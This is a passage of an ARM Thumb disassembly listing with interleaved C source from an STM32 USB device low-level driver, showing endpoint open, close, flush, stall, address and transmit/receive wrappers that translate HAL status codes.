 800cd3a:	2303      	movs	r3, #3
 800cd3c:	73fb      	strb	r3, [r7, #15]
    break;
 800cd3e:	e008      	b.n	800cd52 <USBD_LL_Start+0x5a>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800cd40:	2301      	movs	r3, #1
 800cd42:	73fb      	strb	r3, [r7, #15]
    break;
 800cd44:	e005      	b.n	800cd52 <USBD_LL_Start+0x5a>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800cd46:	2303      	movs	r3, #3
 800cd48:	73fb      	strb	r3, [r7, #15]
    break;
 800cd4a:	e002      	b.n	800cd52 <USBD_LL_Start+0x5a>
    default :
      usb_status = USBD_FAIL;
 800cd4c:	2303      	movs	r3, #3
 800cd4e:	73fb      	strb	r3, [r7, #15]
    break;
 800cd50:	bf00      	nop
  }
  return usb_status;
 800cd52:	7bfb      	ldrb	r3, [r7, #15]
}
 800cd54:	4618      	mov	r0, r3
 800cd56:	3710      	adds	r7, #16
 800cd58:	46bd      	mov	sp, r7
 800cd5a:	bd80      	pop	{r7, pc}

0800cd5c <USBD_LL_OpenEP>:
  * @param  ep_type: Endpoint type
  * @param  ep_mps: Endpoint max packet size
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_OpenEP(USBD_HandleTypeDef *pdev, uint8_t ep_addr, uint8_t ep_type, uint16_t ep_mps)
{
 800cd5c:	b580      	push	{r7, lr}
 800cd5e:	b084      	sub	sp, #16
 800cd60:	af00      	add	r7, sp, #0
 800cd62:	6078      	str	r0, [r7, #4]
 800cd64:	4608      	mov	r0, r1
 800cd66:	4611      	mov	r1, r2
 800cd68:	461a      	mov	r2, r3
 800cd6a:	4603      	mov	r3, r0
 800cd6c:	70fb      	strb	r3, [r7, #3]
 800cd6e:	460b      	mov	r3, r1
 800cd70:	70bb      	strb	r3, [r7, #2]
 800cd72:	4613      	mov	r3, r2
 800cd74:	803b      	strh	r3, [r7, #0]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800cd76:	2300      	movs	r3, #0
 800cd78:	73bb      	strb	r3, [r7, #14]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800cd7a:	2300      	movs	r3, #0
 800cd7c:	73fb      	strb	r3, [r7, #15]

  hal_status = HAL_PCD_EP_Open(pdev->pData, ep_addr, ep_mps, ep_type);
 800cd7e:	687b      	ldr	r3, [r7, #4]
 800cd80:	f8d3 02c8 	ldr.w	r0, [r3, #712]	; 0x2c8
 800cd84:	78bb      	ldrb	r3, [r7, #2]
 800cd86:	883a      	ldrh	r2, [r7, #0]
 800cd88:	78f9      	ldrb	r1, [r7, #3]
 800cd8a:	f7f5 fae1 	bl	8002350 <HAL_PCD_EP_Open>
 800cd8e:	4603      	mov	r3, r0
 800cd90:	73bb      	strb	r3, [r7, #14]

  switch (hal_status) {
 800cd92:	7bbb      	ldrb	r3, [r7, #14]
 800cd94:	2b03      	cmp	r3, #3
 800cd96:	d817      	bhi.n	800cdc8 <USBD_LL_OpenEP+0x6c>
 800cd98:	a201      	add	r2, pc, #4	; (adr r2, 800cda0 <USBD_LL_OpenEP+0x44>)
 800cd9a:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800cd9e:	bf00      	nop
 800cda0:	0800cdb1 	.word	0x0800cdb1
 800cda4:	0800cdb7 	.word	0x0800cdb7
 800cda8:	0800cdbd 	.word	0x0800cdbd
 800cdac:	0800cdc3 	.word	0x0800cdc3
    case HAL_OK :
      usb_status = USBD_OK;
 800cdb0:	2300      	movs	r3, #0
 800cdb2:	73fb      	strb	r3, [r7, #15]
    break;
 800cdb4:	e00b      	b.n	800cdce <USBD_LL_OpenEP+0x72>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800cdb6:	2303      	movs	r3, #3
 800cdb8:	73fb      	strb	r3, [r7, #15]
    break;
 800cdba:	e008      	b.n	800cdce <USBD_LL_OpenEP+0x72>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800cdbc:	2301      	movs	r3, #1
 800cdbe:	73fb      	strb	r3, [r7, #15]
    break;
 800cdc0:	e005      	b.n	800cdce <USBD_LL_OpenEP+0x72>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800cdc2:	2303      	movs	r3, #3
 800cdc4:	73fb      	strb	r3, [r7, #15]
    break;
 800cdc6:	e002      	b.n	800cdce <USBD_LL_OpenEP+0x72>
    default :
      usb_status = USBD_FAIL;
 800cdc8:	2303      	movs	r3, #3
 800cdca:	73fb      	strb	r3, [r7, #15]
    break;
 800cdcc:	bf00      	nop
  }
  return usb_status;
 800cdce:	7bfb      	ldrb	r3, [r7, #15]
}
 800cdd0:	4618      	mov	r0, r3
 800cdd2:	3710      	adds	r7, #16
 800cdd4:	46bd      	mov	sp, r7
 800cdd6:	bd80      	pop	{r7, pc}

0800cdd8 <USBD_LL_CloseEP>:
  * @param  pdev: Device handle
  * @param  ep_addr: Endpoint number
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_CloseEP(USBD_HandleTypeDef *pdev, uint8_t ep_addr)
{
 800cdd8:	b580      	push	{r7, lr}
 800cdda:	b084      	sub	sp, #16
 800cddc:	af00      	add	r7, sp, #0
 800cdde:	6078      	str	r0, [r7, #4]
 800cde0:	460b      	mov	r3, r1
 800cde2:	70fb      	strb	r3, [r7, #3]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800cde4:	2300      	movs	r3, #0
 800cde6:	73bb      	strb	r3, [r7, #14]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800cde8:	2300      	movs	r3, #0
 800cdea:	73fb      	strb	r3, [r7, #15]

  hal_status = HAL_PCD_EP_Close(pdev->pData, ep_addr);
 800cdec:	687b      	ldr	r3, [r7, #4]
 800cdee:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800cdf2:	78fa      	ldrb	r2, [r7, #3]
 800cdf4:	4611      	mov	r1, r2
 800cdf6:	4618      	mov	r0, r3
 800cdf8:	f7f5 fb07 	bl	800240a <HAL_PCD_EP_Close>
 800cdfc:	4603      	mov	r3, r0
 800cdfe:	73bb      	strb	r3, [r7, #14]

  switch (hal_status) {
 800ce00:	7bbb      	ldrb	r3, [r7, #14]
 800ce02:	2b03      	cmp	r3, #3
 800ce04:	d816      	bhi.n	800ce34 <USBD_LL_CloseEP+0x5c>
 800ce06:	a201      	add	r2, pc, #4	; (adr r2, 800ce0c <USBD_LL_CloseEP+0x34>)
 800ce08:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800ce0c:	0800ce1d 	.word	0x0800ce1d
 800ce10:	0800ce23 	.word	0x0800ce23
 800ce14:	0800ce29 	.word	0x0800ce29
 800ce18:	0800ce2f 	.word	0x0800ce2f
    case HAL_OK :
      usb_status = USBD_OK;
 800ce1c:	2300      	movs	r3, #0
 800ce1e:	73fb      	strb	r3, [r7, #15]
    break;
 800ce20:	e00b      	b.n	800ce3a <USBD_LL_CloseEP+0x62>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800ce22:	2303      	movs	r3, #3
 800ce24:	73fb      	strb	r3, [r7, #15]
    break;
 800ce26:	e008      	b.n	800ce3a <USBD_LL_CloseEP+0x62>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800ce28:	2301      	movs	r3, #1
 800ce2a:	73fb      	strb	r3, [r7, #15]
    break;
 800ce2c:	e005      	b.n	800ce3a <USBD_LL_CloseEP+0x62>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800ce2e:	2303      	movs	r3, #3
 800ce30:	73fb      	strb	r3, [r7, #15]
    break;
 800ce32:	e002      	b.n	800ce3a <USBD_LL_CloseEP+0x62>
    default :
      usb_status = USBD_FAIL;
 800ce34:	2303      	movs	r3, #3
 800ce36:	73fb      	strb	r3, [r7, #15]
    break;
 800ce38:	bf00      	nop
  }
  return usb_status;
 800ce3a:	7bfb      	ldrb	r3, [r7, #15]
}
 800ce3c:	4618      	mov	r0, r3
 800ce3e:	3710      	adds	r7, #16
 800ce40:	46bd      	mov	sp, r7
 800ce42:	bd80      	pop	{r7, pc}

0800ce44 <USBD_LL_FlushEP>:
  * @param  pdev: Device handle
  * @param  ep_addr: Endpoint number
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_FlushEP(USBD_HandleTypeDef *pdev, uint8_t ep_addr)
{
 800ce44:	b580      	push	{r7, lr}
 800ce46:	b084      	sub	sp, #16
 800ce48:	af00      	add	r7, sp, #0
 800ce4a:	6078      	str	r0, [r7, #4]
 800ce4c:	460b      	mov	r3, r1
 800ce4e:	70fb      	strb	r3, [r7, #3]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800ce50:	2300      	movs	r3, #0
 800ce52:	73bb      	strb	r3, [r7, #14]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800ce54:	2300      	movs	r3, #0
 800ce56:	73fb      	strb	r3, [r7, #15]

  hal_status = HAL_PCD_EP_Flush(pdev->pData, ep_addr);
 800ce58:	687b      	ldr	r3, [r7, #4]
 800ce5a:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800ce5e:	78fa      	ldrb	r2, [r7, #3]
 800ce60:	4611      	mov	r1, r2
 800ce62:	4618      	mov	r0, r3
 800ce64:	f7f5 fc66 	bl	8002734 <HAL_PCD_EP_Flush>
 800ce68:	4603      	mov	r3, r0
 800ce6a:	73bb      	strb	r3, [r7, #14]

  switch (hal_status) {
 800ce6c:	7bbb      	ldrb	r3, [r7, #14]
 800ce6e:	2b03      	cmp	r3, #3
 800ce70:	d816      	bhi.n	800cea0 <USBD_LL_FlushEP+0x5c>
 800ce72:	a201      	add	r2, pc, #4	; (adr r2, 800ce78 <USBD_LL_FlushEP+0x34>)
 800ce74:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800ce78:	0800ce89 	.word	0x0800ce89
 800ce7c:	0800ce8f 	.word	0x0800ce8f
 800ce80:	0800ce95 	.word	0x0800ce95
 800ce84:	0800ce9b 	.word	0x0800ce9b
    case HAL_OK :
      usb_status = USBD_OK;
 800ce88:	2300      	movs	r3, #0
 800ce8a:	73fb      	strb	r3, [r7, #15]
    break;
 800ce8c:	e00b      	b.n	800cea6 <USBD_LL_FlushEP+0x62>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800ce8e:	2303      	movs	r3, #3
 800ce90:	73fb      	strb	r3, [r7, #15]
    break;
 800ce92:	e008      	b.n	800cea6 <USBD_LL_FlushEP+0x62>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800ce94:	2301      	movs	r3, #1
 800ce96:	73fb      	strb	r3, [r7, #15]
    break;
 800ce98:	e005      	b.n	800cea6 <USBD_LL_FlushEP+0x62>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800ce9a:	2303      	movs	r3, #3
 800ce9c:	73fb      	strb	r3, [r7, #15]
    break;
 800ce9e:	e002      	b.n	800cea6 <USBD_LL_FlushEP+0x62>
    default :
      usb_status = USBD_FAIL;
 800cea0:	2303      	movs	r3, #3
 800cea2:	73fb      	strb	r3, [r7, #15]
    break;
 800cea4:	bf00      	nop
  }
  return usb_status;
 800cea6:	7bfb      	ldrb	r3, [r7, #15]
}
 800cea8:	4618      	mov	r0, r3
 800ceaa:	3710      	adds	r7, #16
 800ceac:	46bd      	mov	sp, r7
 800ceae:	bd80      	pop	{r7, pc}

0800ceb0 <USBD_LL_StallEP>:
  * @param  pdev: Device handle
  * @param  ep_addr: Endpoint number
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_StallEP(USBD_HandleTypeDef *pdev, uint8_t ep_addr)
{
 800ceb0:	b580      	push	{r7, lr}
 800ceb2:	b084      	sub	sp, #16
 800ceb4:	af00      	add	r7, sp, #0
 800ceb6:	6078      	str	r0, [r7, #4]
 800ceb8:	460b      	mov	r3, r1
 800ceba:	70fb      	strb	r3, [r7, #3]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800cebc:	2300      	movs	r3, #0
 800cebe:	73bb      	strb	r3, [r7, #14]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800cec0:	2300      	movs	r3, #0
 800cec2:	73fb      	strb	r3, [r7, #15]

  hal_status = HAL_PCD_EP_SetStall(pdev->pData, ep_addr);
 800cec4:	687b      	ldr	r3, [r7, #4]
 800cec6:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800ceca:	78fa      	ldrb	r2, [r7, #3]
 800cecc:	4611      	mov	r1, r2
 800cece:	4618      	mov	r0, r3
 800ced0:	f7f5 fb7c 	bl	80025cc <HAL_PCD_EP_SetStall>
 800ced4:	4603      	mov	r3, r0
 800ced6:	73bb      	strb	r3, [r7, #14]

  switch (hal_status) {
 800ced8:	7bbb      	ldrb	r3, [r7, #14]
 800ceda:	2b03      	cmp	r3, #3
 800cedc:	d816      	bhi.n	800cf0c <USBD_LL_StallEP+0x5c>
 800cede:	a201      	add	r2, pc, #4	; (adr r2, 800cee4 <USBD_LL_StallEP+0x34>)
 800cee0:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800cee4:	0800cef5 	.word	0x0800cef5
 800cee8:	0800cefb 	.word	0x0800cefb
 800ceec:	0800cf01 	.word	0x0800cf01
 800cef0:	0800cf07 	.word	0x0800cf07
    case HAL_OK :
      usb_status = USBD_OK;
 800cef4:	2300      	movs	r3, #0
 800cef6:	73fb      	strb	r3, [r7, #15]
    break;
 800cef8:	e00b      	b.n	800cf12 <USBD_LL_StallEP+0x62>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800cefa:	2303      	movs	r3, #3
 800cefc:	73fb      	strb	r3, [r7, #15]
    break;
 800cefe:	e008      	b.n	800cf12 <USBD_LL_StallEP+0x62>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800cf00:	2301      	movs	r3, #1
 800cf02:	73fb      	strb	r3, [r7, #15]
    break;
 800cf04:	e005      	b.n	800cf12 <USBD_LL_StallEP+0x62>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800cf06:	2303      	movs	r3, #3
 800cf08:	73fb      	strb	r3, [r7, #15]
    break;
 800cf0a:	e002      	b.n	800cf12 <USBD_LL_StallEP+0x62>
    default :
      usb_status = USBD_FAIL;
 800cf0c:	2303      	movs	r3, #3
 800cf0e:	73fb      	strb	r3, [r7, #15]
    break;
 800cf10:	bf00      	nop
  }
  return usb_status;
 800cf12:	7bfb      	ldrb	r3, [r7, #15]
}
 800cf14:	4618      	mov	r0, r3
 800cf16:	3710      	adds	r7, #16
 800cf18:	46bd      	mov	sp, r7
 800cf1a:	bd80      	pop	{r7, pc}

0800cf1c <USBD_LL_ClearStallEP>:
  * @param  pdev: Device handle
  * @param  ep_addr: Endpoint number
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_ClearStallEP(USBD_HandleTypeDef *pdev, uint8_t ep_addr)
{
 800cf1c:	b580      	push	{r7, lr}
 800cf1e:	b084      	sub	sp, #16
 800cf20:	af00      	add	r7, sp, #0
 800cf22:	6078      	str	r0, [r7, #4]
 800cf24:	460b      	mov	r3, r1
 800cf26:	70fb      	strb	r3, [r7, #3]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800cf28:	2300      	movs	r3, #0
 800cf2a:	73bb      	strb	r3, [r7, #14]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800cf2c:	2300      	movs	r3, #0
 800cf2e:	73fb      	strb	r3, [r7, #15]

  hal_status = HAL_PCD_EP_ClrStall(pdev->pData, ep_addr);
 800cf30:	687b      	ldr	r3, [r7, #4]
 800cf32:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800cf36:	78fa      	ldrb	r2, [r7, #3]
 800cf38:	4611      	mov	r1, r2
 800cf3a:	4618      	mov	r0, r3
 800cf3c:	f7f5 fba6 	bl	800268c <HAL_PCD_EP_ClrStall>
 800cf40:	4603      	mov	r3, r0
 800cf42:	73bb      	strb	r3, [r7, #14]

  switch (hal_status) {
 800cf44:	7bbb      	ldrb	r3, [r7, #14]
 800cf46:	2b03      	cmp	r3, #3
 800cf48:	d816      	bhi.n	800cf78 <USBD_LL_ClearStallEP+0x5c>
 800cf4a:	a201      	add	r2, pc, #4	; (adr r2, 800cf50 <USBD_LL_ClearStallEP+0x34>)
 800cf4c:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800cf50:	0800cf61 	.word	0x0800cf61
 800cf54:	0800cf67 	.word	0x0800cf67
 800cf58:	0800cf6d 	.word	0x0800cf6d
 800cf5c:	0800cf73 	.word	0x0800cf73
    case HAL_OK :
      usb_status = USBD_OK;
 800cf60:	2300      	movs	r3, #0
 800cf62:	73fb      	strb	r3, [r7, #15]
    break;
 800cf64:	e00b      	b.n	800cf7e <USBD_LL_ClearStallEP+0x62>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800cf66:	2303      	movs	r3, #3
 800cf68:	73fb      	strb	r3, [r7, #15]
    break;
 800cf6a:	e008      	b.n	800cf7e <USBD_LL_ClearStallEP+0x62>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800cf6c:	2301      	movs	r3, #1
 800cf6e:	73fb      	strb	r3, [r7, #15]
    break;
 800cf70:	e005      	b.n	800cf7e <USBD_LL_ClearStallEP+0x62>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800cf72:	2303      	movs	r3, #3
 800cf74:	73fb      	strb	r3, [r7, #15]
    break;
 800cf76:	e002      	b.n	800cf7e <USBD_LL_ClearStallEP+0x62>
    default :
      usb_status = USBD_FAIL;
 800cf78:	2303      	movs	r3, #3
 800cf7a:	73fb      	strb	r3, [r7, #15]
    break;
 800cf7c:	bf00      	nop
  }
  return usb_status;
 800cf7e:	7bfb      	ldrb	r3, [r7, #15]
}
 800cf80:	4618      	mov	r0, r3
 800cf82:	3710      	adds	r7, #16
 800cf84:	46bd      	mov	sp, r7
 800cf86:	bd80      	pop	{r7, pc}

0800cf88 <USBD_LL_IsStallEP>:
  * @param  pdev: Device handle
  * @param  ep_addr: Endpoint number
  * @retval Stall (1: Yes, 0: No)
  */
uint8_t USBD_LL_IsStallEP(USBD_HandleTypeDef *pdev, uint8_t ep_addr)
{
 800cf88:	b480      	push	{r7}
 800cf8a:	b085      	sub	sp, #20
 800cf8c:	af00      	add	r7, sp, #0
 800cf8e:	6078      	str	r0, [r7, #4]
 800cf90:	460b      	mov	r3, r1
 800cf92:	70fb      	strb	r3, [r7, #3]
  PCD_HandleTypeDef *hpcd = (PCD_HandleTypeDef*) pdev->pData;
 800cf94:	687b      	ldr	r3, [r7, #4]
 800cf96:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800cf9a:	60fb      	str	r3, [r7, #12]

  if((ep_addr & 0x80) == 0x80)
 800cf9c:	f997 3003 	ldrsb.w	r3, [r7, #3]
 800cfa0:	2b00      	cmp	r3, #0
 800cfa2:	da0c      	bge.n	800cfbe <USBD_LL_IsStallEP+0x36>
  {
    return hpcd->IN_ep[ep_addr & 0x7F].is_stall;
 800cfa4:	78fb      	ldrb	r3, [r7, #3]
 800cfa6:	f003 037f 	and.w	r3, r3, #127	; 0x7f
 800cfaa:	68f9      	ldr	r1, [r7, #12]
 800cfac:	1c5a      	adds	r2, r3, #1
 800cfae:	4613      	mov	r3, r2
 800cfb0:	009b      	lsls	r3, r3, #2
 800cfb2:	4413      	add	r3, r2
 800cfb4:	00db      	lsls	r3, r3, #3
 800cfb6:	440b      	add	r3, r1
 800cfb8:	3302      	adds	r3, #2
 800cfba:	781b      	ldrb	r3, [r3, #0]
 800cfbc:	e00b      	b.n	800cfd6 <USBD_LL_IsStallEP+0x4e>
  }
  else
  {
    return hpcd->OUT_ep[ep_addr & 0x7F].is_stall;
 800cfbe:	78fb      	ldrb	r3, [r7, #3]
 800cfc0:	f003 027f 	and.w	r2, r3, #127	; 0x7f
 800cfc4:	68f9      	ldr	r1, [r7, #12]
 800cfc6:	4613      	mov	r3, r2
 800cfc8:	009b      	lsls	r3, r3, #2
 800cfca:	4413      	add	r3, r2
 800cfcc:	00db      	lsls	r3, r3, #3
 800cfce:	440b      	add	r3, r1
 800cfd0:	f503 73b5 	add.w	r3, r3, #362	; 0x16a
 800cfd4:	781b      	ldrb	r3, [r3, #0]
  }
}
 800cfd6:	4618      	mov	r0, r3
 800cfd8:	3714      	adds	r7, #20
 800cfda:	46bd      	mov	sp, r7
 800cfdc:	f85d 7b04 	ldr.w	r7, [sp], #4
 800cfe0:	4770      	bx	lr
	...

0800cfe4 <USBD_LL_SetUSBAddress>:
  * @param  pdev: Device handle
  * @param  dev_addr: Device address
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_SetUSBAddress(USBD_HandleTypeDef *pdev, uint8_t dev_addr)
{
 800cfe4:	b580      	push	{r7, lr}
 800cfe6:	b084      	sub	sp, #16
 800cfe8:	af00      	add	r7, sp, #0
 800cfea:	6078      	str	r0, [r7, #4]
 800cfec:	460b      	mov	r3, r1
 800cfee:	70fb      	strb	r3, [r7, #3]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800cff0:	2300      	movs	r3, #0
 800cff2:	73bb      	strb	r3, [r7, #14]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800cff4:	2300      	movs	r3, #0
 800cff6:	73fb      	strb	r3, [r7, #15]

  hal_status = HAL_PCD_SetAddress(pdev->pData, dev_addr);
 800cff8:	687b      	ldr	r3, [r7, #4]
 800cffa:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800cffe:	78fa      	ldrb	r2, [r7, #3]
 800d000:	4611      	mov	r1, r2
 800d002:	4618      	mov	r0, r3
 800d004:	f7f5 f97f 	bl	8002306 <HAL_PCD_SetAddress>
 800d008:	4603      	mov	r3, r0
 800d00a:	73bb      	strb	r3, [r7, #14]

  switch (hal_status) {
 800d00c:	7bbb      	ldrb	r3, [r7, #14]
 800d00e:	2b03      	cmp	r3, #3
 800d010:	d816      	bhi.n	800d040 <USBD_LL_SetUSBAddress+0x5c>
 800d012:	a201      	add	r2, pc, #4	; (adr r2, 800d018 <USBD_LL_SetUSBAddress+0x34>)
 800d014:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800d018:	0800d029 	.word	0x0800d029
 800d01c:	0800d02f 	.word	0x0800d02f
 800d020:	0800d035 	.word	0x0800d035
 800d024:	0800d03b 	.word	0x0800d03b
    case HAL_OK :
      usb_status = USBD_OK;
 800d028:	2300      	movs	r3, #0
 800d02a:	73fb      	strb	r3, [r7, #15]
    break;
 800d02c:	e00b      	b.n	800d046 <USBD_LL_SetUSBAddress+0x62>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800d02e:	2303      	movs	r3, #3
 800d030:	73fb      	strb	r3, [r7, #15]
    break;
 800d032:	e008      	b.n	800d046 <USBD_LL_SetUSBAddress+0x62>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800d034:	2301      	movs	r3, #1
 800d036:	73fb      	strb	r3, [r7, #15]
    break;
 800d038:	e005      	b.n	800d046 <USBD_LL_SetUSBAddress+0x62>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800d03a:	2303      	movs	r3, #3
 800d03c:	73fb      	strb	r3, [r7, #15]
    break;
 800d03e:	e002      	b.n	800d046 <USBD_LL_SetUSBAddress+0x62>
    default :
      usb_status = USBD_FAIL;
 800d040:	2303      	movs	r3, #3
 800d042:	73fb      	strb	r3, [r7, #15]
    break;
 800d044:	bf00      	nop
  }
  return usb_status;
 800d046:	7bfb      	ldrb	r3, [r7, #15]
}
 800d048:	4618      	mov	r0, r3
 800d04a:	3710      	adds	r7, #16
 800d04c:	46bd      	mov	sp, r7
 800d04e:	bd80      	pop	{r7, pc}

0800d050 <USBD_LL_Transmit>:
  * @param  pbuf: Pointer to data to be sent
  * @param  size: Data size
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_Transmit(USBD_HandleTypeDef *pdev, uint8_t ep_addr, uint8_t *pbuf, uint32_t size)
{
 800d050:	b580      	push	{r7, lr}
 800d052:	b086      	sub	sp, #24
 800d054:	af00      	add	r7, sp, #0
 800d056:	60f8      	str	r0, [r7, #12]
 800d058:	607a      	str	r2, [r7, #4]
 800d05a:	603b      	str	r3, [r7, #0]
 800d05c:	460b      	mov	r3, r1
 800d05e:	72fb      	strb	r3, [r7, #11]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800d060:	2300      	movs	r3, #0
 800d062:	75bb      	strb	r3, [r7, #22]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800d064:	2300      	movs	r3, #0
 800d066:	75fb      	strb	r3, [r7, #23]

  hal_status = HAL_PCD_EP_Transmit(pdev->pData, ep_addr, pbuf, size);
 800d068:	68fb      	ldr	r3, [r7, #12]
 800d06a:	f8d3 02c8 	ldr.w	r0, [r3, #712]	; 0x2c8
 800d06e:	7af9      	ldrb	r1, [r7, #11]
 800d070:	683b      	ldr	r3, [r7, #0]
 800d072:	687a      	ldr	r2, [r7, #4]
 800d074:	f7f5 fa5a 	bl	800252c <HAL_PCD_EP_Transmit>
 800d078:	4603      	mov	r3, r0
 800d07a:	75bb      	strb	r3, [r7, #22]

  switch (hal_status) {
 800d07c:	7dbb      	ldrb	r3, [r7, #22]
 800d07e:	2b03      	cmp	r3, #3
 800d080:	d816      	bhi.n	800d0b0 <USBD_LL_Transmit+0x60>
 800d082:	a201      	add	r2, pc, #4	; (adr r2, 800d088 <USBD_LL_Transmit+0x38>)
 800d084:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800d088:	0800d099 	.word	0x0800d099
 800d08c:	0800d09f 	.word	0x0800d09f
 800d090:	0800d0a5 	.word	0x0800d0a5
 800d094:	0800d0ab 	.word	0x0800d0ab
    case HAL_OK :
      usb_status = USBD_OK;
 800d098:	2300      	movs	r3, #0
 800d09a:	75fb      	strb	r3, [r7, #23]
    break;
 800d09c:	e00b      	b.n	800d0b6 <USBD_LL_Transmit+0x66>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800d09e:	2303      	movs	r3, #3
 800d0a0:	75fb      	strb	r3, [r7, #23]
    break;
 800d0a2:	e008      	b.n	800d0b6 <USBD_LL_Transmit+0x66>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800d0a4:	2301      	movs	r3, #1
 800d0a6:	75fb      	strb	r3, [r7, #23]
    break;
 800d0a8:	e005      	b.n	800d0b6 <USBD_LL_Transmit+0x66>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800d0aa:	2303      	movs	r3, #3
 800d0ac:	75fb      	strb	r3, [r7, #23]
    break;
 800d0ae:	e002      	b.n	800d0b6 <USBD_LL_Transmit+0x66>
    default :
      usb_status = USBD_FAIL;
 800d0b0:	2303      	movs	r3, #3
 800d0b2:	75fb      	strb	r3, [r7, #23]
    break;
 800d0b4:	bf00      	nop
  }
  return usb_status;
 800d0b6:	7dfb      	ldrb	r3, [r7, #23]
}
 800d0b8:	4618      	mov	r0, r3
 800d0ba:	3718      	adds	r7, #24
 800d0bc:	46bd      	mov	sp, r7
 800d0be:	bd80      	pop	{r7, pc}

0800d0c0 <USBD_LL_PrepareReceive>:
  * @param  pbuf: Pointer to data to be received
  * @param  size: Data size
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_PrepareReceive(USBD_HandleTypeDef *pdev, uint8_t ep_addr, uint8_t *pbuf, uint32_t size)
{
 800d0c0:	b580      	push	{r7, lr}
 800d0c2:	b086      	sub	sp, #24
 800d0c4:	af00      	add	r7, sp, #0
 800d0c6:	60f8      	str	r0, [r7, #12]
 800d0c8:	607a      	str	r2, [r7, #4]
 800d0ca:	603b      	str	r3, [r7, #0]
 800d0cc:	460b      	mov	r3, r1
 800d0ce:	72fb      	strb	r3, [r7, #11]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800d0d0:	2300      	movs	r3, #0
 800d0d2:	75bb      	strb	r3, [r7, #22]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800d0d4:	2300      	movs	r3, #0
 800d0d6:	75fb      	strb	r3, [r7, #23]

  hal_status = HAL_PCD_EP_Receive(pdev->pData, ep_addr, pbuf, size);
 800d0d8:	68fb      	ldr	r3, [r7, #12]
 800d0da:	f8d3 02c8 	ldr.w	r0, [r3, #712]	; 0x2c8
 800d0de:	7af9      	ldrb	r1, [r7, #11]
 800d0e0:	683b      	ldr	r3, [r7, #0]
 800d0e2:	687a      	ldr	r2, [r7, #4]
 800d0e4:	f7f5 f9d9 	bl	800249a <HAL_PCD_EP_Receive>
 800d0e8:	4603      	mov	r3, r0
 800d0ea:	75bb      	strb	r3, [r7, #22]

  switch (hal_status) {
 800d0ec:	7dbb      	ldrb	r3, [r7, #22]
 800d0ee:	2b03      	cmp	r3, #3
 800d0f0:	d816      	bhi.n	800d120 <USBD_LL_PrepareReceive+0x60>
 800d0f2:	a201      	add	r2, pc, #4	; (adr r2, 800d0f8 <USBD_LL_PrepareReceive+0x38>)
 800d0f4:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800d0f8:	0800d109 	.word	0x0800d109
 800d0fc:	0800d10f 	.word	0x0800d10f
 800d100:	0800d115 	.word	0x0800d115
 800d104:	0800d11b 	.word	0x0800d11b
    case HAL_OK :
      usb_status = USBD_OK;
 800d108:	2300      	movs	r3, #0
 800d10a:	75fb      	strb	r3, [r7, #23]
    break;
 800d10c:	e00b      	b.n	800d126 <USBD_LL_PrepareReceive+0x66>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800d10e:	2303      	movs	r3, #3
 800d110:	75fb      	strb	r3, [r7, #23]
    break;
 800d112:	e008      	b.n	800d126 <USBD_LL_PrepareReceive+0x66>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
